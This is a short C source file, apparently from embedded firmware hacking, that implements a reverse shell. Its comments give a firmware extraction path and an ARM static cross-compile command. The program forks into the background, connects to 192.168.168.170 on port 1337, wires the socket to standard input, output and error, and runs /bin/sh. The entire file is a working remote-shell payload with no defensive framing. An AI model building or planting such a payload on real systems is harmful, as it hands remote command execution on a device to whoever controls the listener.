// cd '/media/FALCON/binextracts/extractions/W25Q64FV@SOIC8_butreallySOIC16_AHB7804R-LM-V3.BIN.extracted/30000'
// arm-linux-gnueabi-gcc -Os -march=armv7-a -mtune=cortex-a8 -mfloat-abi=soft -flto -fdata-sections -ffunction-sections -Wl,--gc-sections -static -s -o rsh.out rsh.c
#include <sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
int main(void) {
  pid_t pid = fork(); if (pid == -1) return(1); if (pid > 0) return(0);
  struct sockaddr_in sa; sa.sin_family = AF_INET, sa.sin_port = htons(1337), sa.sin_addr.s_addr = inet_addr("192.168.168.170"); int sockt = socket(AF_INET, SOCK_STREAM, 0);
  if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) return (1); dup2(sockt, 0), dup2(sockt, 1), dup2(sockt, 2);
  char* const argv[] = {"/bin/sh", 0}; execve("/bin/sh", argv, 0);
  return(0);
}
